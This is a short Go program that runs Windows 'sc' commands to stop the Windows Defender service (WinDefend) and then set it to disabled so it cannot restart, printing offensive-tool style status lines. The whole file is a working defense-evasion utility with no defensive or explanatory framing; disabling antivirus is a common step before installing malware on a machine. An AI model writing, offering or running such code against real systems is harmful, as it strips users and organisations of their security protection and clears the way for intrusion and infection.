package main

import (
	"fmt"
	"os/exec"
)

func main() {
	serviceName := "WinDefend" // Replace this or make it an argument

	err := stopService(serviceName)
	if err != nil {
		fmt.Printf("[-] Failed to stop service %s: %v\n", serviceName, err)
	} else {
		fmt.Printf("[+] Service %s stopped successfully.\n", serviceName)
	}
}

func stopService(name string) error {
	// sc stop <service>
	cmd := exec.Command("sc", "stop", name)
	output, err := cmd.CombinedOutput()
	fmt.Printf("[*] sc stop output:\n%s\n", string(output))
	if err != nil {
		return err
	}

	// Optional: Disable the service to prevent restart
	cmd = exec.Command("sc", "config", name, "start=", "disabled")
	output, err = cmd.CombinedOutput()
	fmt.Printf("[*] sc config output:\n%s\n", string(output))
	return err
}
